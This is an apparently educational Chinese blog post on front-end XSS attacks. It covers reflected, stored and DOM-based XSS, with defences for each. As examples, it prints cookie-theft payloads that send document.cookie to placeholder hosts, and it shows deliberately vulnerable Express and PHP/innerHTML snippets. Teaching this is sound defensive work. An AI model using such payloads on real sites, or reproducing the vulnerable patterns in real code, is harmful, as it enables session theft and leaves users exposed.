---
layout: post
title:  前端安全之XSS攻击
date: 2018/04/15
---

## 定义
XSS（cross-site scripting跨域脚本攻击）攻击是最常见的Web攻击，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。(摘自百科)  

大体的来说XSS分为三类：

* Reflected XSS（基于反射的XSS攻击）
* Stored XSS（基于存储的XSS攻击）
* DOM-based or local XSS（基于DOM或本地的XSS攻击）

### Reflected XSS
基本原理：后台接收到用户的输入后不经任何处理直接把用户输入的数据“反射”给浏览器，即用户输入的参数直接输出到页面上。
特点：非持久化一般通过url的形式传播

一个典型的列子：
> http://www.xxxx.cn/get?xxx=&lt; script&gt; 'http://xxx.com/get?cookie='+document.cookie&lt; /script&gt;

就像这个例子，后台获取到了xxx的参数，然后不作处理直接输入返回给前端

```javascript
app.post('/get', function(req, res) {
    let xxx = req.query.xxx
    res.json(xxx);
});
```
这样http://www.xxxx.cn/get?xxx=&lt; script&gt; 'http://xxx.com/get?cookie='+document.cookie&lt; /script&gt;这段代码就直接在客户端直接运行了，等获取用户的cookie之后就可以无所欲为了，现在的spa应用路由直接由前端来负责了，其实原理也是一样的，只不过少了服务端返回这一步骤。

防御：

    1. 对一些特殊的标签进行转义； 
    2. 直接过滤掉JavaScript事件标签和一些特殊的html标签； 
    3. 将重要的cookie标记为http only；
    4. 只允许用户输入我们期望的数据；
    5. 对数据进行html encode处理等；

    
### Stored XSS
基本原理： 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。
特点： 持久化，一旦展现在页面上受众较多

典型的例子：
  这个在博客型网址中较为常见，当用户在发表文章时插入这么一段代码&lt; script&gt; 'http://xxx.com/get?cookie='+document.cookie&lt; /script&gt;倘若后端没过滤，把它直接存储在数据库里头，当其他人看这篇文章的时候，包含的恶意脚本就会执行。正在访问用户的cookie就会被发送到脚本指定的主机里头去，拿到cookies后又可以为所欲为了。
  
防御：


    1. 主要是服务端要进行过滤
    2. 前端也可对一些标签转义

    
### DOM-based or local XSS

基本原理： DOM-Based XSS是一种基于文档对象模型（Document Object Model，DOM)的Web前端漏洞，简单来说就是JavaScript代码缺陷造成的漏洞。与普通XSS不同的是，DOM XSS是在浏览器的解析中改变页面DOM树。

举几个列子：

```javascript
<script>
var img = document.createElement("img");
img.src = "http://xxxxx/cookies.php?cookie="+escape(document.cookie);
</script>
利用img的src属性发送get请求
```

```javascript
<script>document.body.innerHTML="<div style=visibility:visible;><h1>This is DOM XSS</h1></div>";</script> 
利用innerHTML属性直接写入到页面
```

看到这有人可能想问，这些操作我自己在控制台也能进行，一般的来说dom xss与反射型xss还是有比较大的关联的，这些代码一般是通过外部返回的。如下可以反映出一个完整的dom xss攻击过程。

```javascript
<?php
error_reporting(0);
$name = $_GET["name"];
?>

<input id="text" type="text" value="<?php echo $name;?>" />
<div id="print"></div>

<script type="text/javascript">
var text = document.getElementById("text"); 
var print = document.getElementById("print");
print.innerHTML = text.value; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。
</script>
（以上代码转自知乎）
```

防御：
    * 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；
    * 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到<script>则进行JS编码。

 





